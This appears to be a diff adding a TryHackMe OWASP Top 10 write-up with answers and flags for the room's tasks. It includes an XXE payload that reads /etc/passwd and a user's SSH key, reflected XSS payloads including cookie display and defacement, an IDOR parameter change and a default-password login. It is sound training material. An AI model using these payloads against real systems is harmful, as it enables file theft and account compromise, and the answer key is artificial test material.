@@ -1,0 +1,139 @@
+THM - OWASP TOP 10 (Part 1 of 3)
+==================================================================
+tryhackme.com/room/owasptop10
+github.com/ttnovo/OWASP_Part1
+by: TTNOVO 
+==================================================================
+If you use own VM you need to use VPN.
+
+1. Download your VPN file on THM, find it and do: sudo openvpn FILE.ovpn
+2. Hit your password and you ready to dive in...
+
+Disclaimer: Never hack anything, that you are not allowed to hack!
+===================================================================
+TASK 13:
+Answers to this task you find by reading from the THM room.
+
+1. Full form of XML
+Answer: Extensible Markup Language
+
+2. Is it compulsory to have XML prolog in XML documents?
+Answer: No
+
+3. Can we validate XML documents against a schema?
+Answer: Yes
+
+4. How can we specify XML version and encoding in XML document?
+Answer: XML prolog
+===================================================================
+TASK 14:
+Answers to this task you find by reading from the THM room.
+
+1. How do you define a new ELEMENT?
+Answer: !ELEMENT
+
+2. How do you define a ROOT element?
+Answer: !DOCTYPE
+
+3. How do you define a new ENTITY?
+Answer: !ENTITY
+===================================================================
+TASK 16:
+Deploy the machine from room 12.
+
+To answer question 1, we need to make a payload, this what I found!
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+
+For Question 3, you just change location to...
+
+‘file:////home/falcon/.ssh/id_rsa>]>
+
+1. What is the name of the user in /etc/passwd
+Answer: falcon
+
+2. Where is falcon's SSH key located?
+Answer: /home/falcon/.ssh/id_rsa (Use Google!)
+
+3. What are the first 18 characters for falcon's private key
+Answer: MIIEogIBAAKCAQEA7
+===================================================================
+TASK 18:
+
+Username: noot
+Password: test1234
+
+http://10.10.71.28/note.php?note=0 (change to 0 and you get the flag)
+
+1. Look at other users notes. What is the flag?
+Answer: flag{fivefourthree}
+===================================================================
+TASK 19:
+
+I noticed by going to the website from IP, that the system was a 
+Pensive notes system, by googling what the default passwords found I
+Found following:
+
+Username: pensive
+Password: PensiveNotes
+
+1. Hack into the webapp, and find the flag!
+Answer: thm{4b9513968fd564a87b28aa1f9d672e17}
+===================================================================
+TASK 20:
+
+I found following payloads for each question in order.
+
+1. <script>alert(“Hello”)</script>
+2. <script>alert(window.location.hostname)</script>
+3. <html><body><p>ttnovo was here</p></body></html>
+4. <script>alert(document.cookie)</script>
+5. <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
+
+
+1. Click on the "Reflected XSS" tab on the navbar.
+Answer: ThereIsMoreToXSSThanYouThink
+
+2. Craft a reflected XSS payload that will cause a popup.
+Answer: ReflectiveXss4TheWin
+
+3. Insert some of your own HTML.
+Answer: HTML_T4gs
+
+4. create an alert popup box appear on the page with your cookies.
+Answer: W3LL_D0N3_LVL2
+
+5. Change "XSS Playground" to "I am a hacker" using JavaScript.
+Answer: websites_can_be_easily_defaced_with_xss
+===================================================================
+TASK 21:
+Answers to this task you find by reading from the THM room.
+
+1. Who developed the Tomcat application?
+Answer: The Apache Software Foundation
+
+2. What type of attack that crashes services can be performed?
+Answer: Denial of Service
+===================================================================
+TASK 22:
+Answers to this task you find by reading from the THM room.
+
+1. If a dog was sleeping, it would be.
+Answer: A Behaviour
+===================================================================
+TASK 23:
+Answers to this task you find by reading from the THM room.
+
+1. What is the name of the base-2 formatting that data is sent?
+Answer: Binary
+===================================================================
+TASK 24:
+Answers to this task you find by reading from the THM room.
+
+1. If a cookie is webapp.com/login , what would the URL be?
+Answer: webapp.com/login
+
+2.  What is the acronym for the web technology that Secure cookies?
+Answer: HTTPS
